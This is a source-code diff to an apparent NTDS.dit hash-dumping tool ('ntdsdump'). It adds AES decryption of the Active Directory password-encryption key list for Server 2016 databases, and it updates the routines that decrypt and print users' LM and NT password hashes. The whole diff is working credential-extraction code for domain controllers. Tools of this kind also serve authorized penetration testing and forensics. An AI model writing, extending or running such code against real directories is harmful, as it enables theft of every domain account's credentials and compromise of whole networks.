@@ -41,7 +41,7 @@ NTDS::NTDS() {
 	instance = NULL;
 	sesId = NULL;
 	dbId = NULL;
-
+	pekList = NULL;
 	// set the page size for NTDS.dit
 	err = JetSetSystemParameter(&instance, JET_sesidNil,
 		JET_paramDatabasePageSize, NTDS_PAGE_SIZE, NULL);
@@ -51,7 +51,7 @@ NTDS::NTDS() {
 			JET_paramRecovery, NULL, (JET_PCSTR)"Off");
 		if (err == JET_errSuccess) {
 			// create an instance
-			err = JetCreateInstance(&instance, (JET_PCSTR)"ntdsdump_0_2");
+			err = JetCreateInstance(&instance, (JET_PCSTR)"ntdsdump_0_3");
 			if (err == JET_errSuccess) {
 				// initialize
 				err = JetInit(&instance);
@@ -292,6 +292,33 @@ BOOL NTDS::EncryptDecryptWithKey(PBYTE pbKey, DWORD dwKeyLen,
 	}
 	return bResult;
 }
+BOOL NTDS::DecryptAes(PBYTE pbKey, DWORD dwKeyLen,
+	PBYTE pbSalt, DWORD dwSaltLen,
+	PBYTE pbData, DWORD dwDataLen) {
+	HCRYPTPROV hProv=0;
+	HCRYPTKEY hKey=0;
+	AES128_KEY_BLOB blob = { 0 };
+	BOOL bResult = FALSE;
+	DWORD d = dwDataLen;
+	if (CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES,
+		CRYPT_NEWKEYSET | CRYPT_VERIFYCONTEXT)) {
+		blob.hdr.bType = PLAINTEXTKEYBLOB;
+		blob.hdr.bVersion = CUR_BLOB_VERSION;
+		blob.hdr.reserved = 0;
+		blob.hdr.aiKeyAlg = CALG_AES_128;
+		blob.dwKeySize = 16;
+		memcpy(blob.bKey, pbKey, 16);
+		if (CryptImportKey(hProv, (PBYTE)&blob, sizeof(AES128_KEY_BLOB), 0, 0, &hKey) && CryptSetKeyParam(hKey, KP_IV, pbSalt, 0))
+		{
+			bResult=CryptDecrypt(hKey, 0, 0, 0, pbData, &d);
+		}
+		CryptDestroyKey(hKey);
+		CryptReleaseContext(hProv, 0);
+	}
+	return bResult;
+}
+
+
 
 static BYTE PekListAuthenticator[PEK_AUTH_LEN] =
 { 0x56, 0xD9, 0x81, 0x48, 0xEC, 0x91, 0xD1, 0x11,
@@ -319,31 +346,68 @@ BOOL NTDS::GetPEKey(PBYTE pbSysKey, PBYTE pbPEKey) {
 		JET_bitTableReadOnly | JET_bitTableSequential, &tableId);
 
 	if (err != JET_errSuccess) {
+		printf("ret 1\n");
 		return FALSE;
 	}
 
 	// go to first
 	err = JetMove(sesId, tableId, JET_MoveFirst, JET_bitNil);
+	
 	// while good read
 	while (err == JET_errSuccess) {
+		
 		DWORD dwPekListSize = 0;
 		err = JetRetrieveColumn(sesId, tableId, pekId,
-			(void*)&pekList, sizeof(pekList), &dwPekListSize, JET_bitNil, NULL);
-
+			0, 0, &dwPekListSize, JET_bitNil, NULL);
+		if (err == JET_wrnBufferTruncated)
+		{
+			pekList = (PPEK_LIST)malloc(dwPekListSize);
+			err = JetRetrieveColumn(sesId, tableId, pekId,
+				pekList, dwPekListSize, &dwPekListSize, JET_bitNil, NULL);
+		}
+		
+		
 		// ensure it's good read and size exceeds size of PEK_LIST structure
 		if (err == JET_errSuccess && dwPekListSize >= sizeof(PEK_LIST)) {
+			
 			// decrypt the data returned
 			// depending on major/minor values in data read
 			// a salt may or may not be required
-			EncryptDecryptWithKey(pbSysKey, SYSTEM_KEY_LEN,
-				pekList.Hdr.bSalt, PEK_SALT_LEN, PEK_SALT_ROUNDS,
-				(PBYTE)&pekList.Data, dwPekListSize - sizeof(PEK_HDR));
-
+			if (pekList->Hdr.dwFlag)
+			{
+				if (pekList->Hdr.dwVersion == 0)
+				{
+					printf("[x]unsupported version :0\n");
+				}
+				else if (pekList->Hdr.dwVersion == 1)
+				{
+					printf("[x]unsupported version: 1\n");
+				}
+				else if (pekList->Hdr.dwVersion == 2)
+				{
+					printf("[+]PEK version: 2k3\n");
+					EncryptDecryptWithKey(pbSysKey, SYSTEM_KEY_LEN,
+						pekList->Hdr.bSalt, PEK_SALT_LEN, PEK_SALT_ROUNDS,
+						(PBYTE)&pekList->Data, dwPekListSize - sizeof(PEK_HDR));
+				}
+				else if (pekList->Hdr.dwVersion == 3)
+				{
+					printf("[+]PEK version: 2016\n");
+					DecryptAes(pbSysKey, SYSTEM_KEY_LEN,
+						pekList->Hdr.bSalt, PEK_SALT_LEN,
+						(PBYTE)&pekList->Data, dwPekListSize - sizeof(PEK_HDR));
+				}
+				else
+				{
+					printf("[x]unknown version :%d\n", pekList->Hdr.dwVersion);
+				}
+			}
 			// verify our decryption was successful.
-			bResult = (memcmp(pekList.Data.bAuth, PekListAuthenticator, PEK_AUTH_LEN) == 0);
+			bResult = (memcmp(pekList->Data.bAuth, PekListAuthenticator, PEK_AUTH_LEN) == 0);
 			if (bResult) {
-				// if good, copy back to buffer
-				memcpy(pbPEKey, pekList.Data.bKey, PEK_VALUE_LEN);
+				 //if good, copy back to buffer
+				memcpy(pbPEKey, pekList->Data.entries[0].bKey, PEK_VALUE_LEN);
+				bResult = 1;
 				break;
 			}
 		}
@@ -527,7 +591,15 @@ DWORD NTDS::GetColumnData(ULONG columnId, PVOID pbBuffer, DWORD cbBufSize) {
 VOID NTDS::PEKDecryptSecretDataBlock(LPBYTE pbData, DWORD dwSize)
 {
 	PSECRET_DATA pSecret = (PSECRET_DATA)pbData;
-	EncryptDecryptWithKey(pekList.Data.bKey, PEK_VALUE_LEN, pSecret->bSalt, PEK_SALT_LEN, 1, &pSecret->pbData, dwSize-24);
+	if (pSecret->wType == SECRET_CRYPT_TYPE_AES)
+	{
+		DecryptAes(pekList->Data.entries[0].bKey, PEK_VALUE_LEN, pSecret->bSalt, PEK_SALT_LEN, (PBYTE)((DWORD)(&pSecret->pbData)+0x4), dwSize - 24-4);
+	}
+	else
+	{
+		EncryptDecryptWithKey(pekList->Data.entries[0].bKey, PEK_VALUE_LEN, pSecret->bSalt, PEK_SALT_LEN, 1, &pSecret->pbData, 0x10);
+	}
+	
 }
 VOID NTDS::DisplayDecrypted(DWORD rid, PBYTE pbHash, FILE* fp,char fmt) {
 	BYTE hash[16];
@@ -538,10 +610,16 @@ VOID NTDS::DisplayDecrypted(DWORD rid, PBYTE pbHash, FILE* fp,char fmt) {
 		fprintf(fp,c,hash[i]);
 	}
 }
-VOID NTDS::DumpHash(DWORD rid, PBYTE pbHash, FILE* fp,char fmt) {
+VOID NTDS::DumpHash(DWORD rid, PBYTE pbHash,DWORD dwLength, FILE* fp,char fmt) {
 
-	PEKDecryptSecretDataBlock(pbHash, 40);
-	DisplayDecrypted(rid, pbHash + 24, fp, fmt);
+		PSECRET_DATA pSecret = (PSECRET_DATA)pbHash;
+		DWORD offset = 24;
+		if (pSecret->wType == SECRET_CRYPT_TYPE_AES)
+		{
+			offset += 4;
+		}
+		PEKDecryptSecretDataBlock(pbHash, dwLength);
+		DisplayDecrypted(rid, pbHash + offset, fp, fmt);
 }
 
 /**********************************************************
@@ -634,7 +712,7 @@ BOOL NTDS::GetHashes(char fmt, BOOL bHistory, BOOL bInactive, BOOL bMachines, BO
 						DWORD ret = GetColumnData(lmId, (PVOID)lmHash, sizeof(lmHash));
 
 						if (err == JET_errSuccess && ret) {
-							DumpHash(rid, lmHash, out, fmt);
+							DumpHash(rid, lmHash,ret, out, fmt);
 						}
 						else {
 							fprintf(out, "aad3b435b51404eeaad3b435b51404ee");
@@ -644,7 +722,7 @@ BOOL NTDS::GetHashes(char fmt, BOOL bHistory, BOOL bInactive, BOOL bMachines, BO
 						ret = GetColumnData(ntId, (PVOID)ntHash, sizeof(ntHash));
 
 						if (err == JET_errSuccess && ret) {
-							DumpHash(rid, ntHash, out, fmt);
+							DumpHash(rid, ntHash,ret, out, fmt);
 						}
 						else {
 							fprintf(out, "31d6cfe0d16ae931b73c59d7e0c089c0");
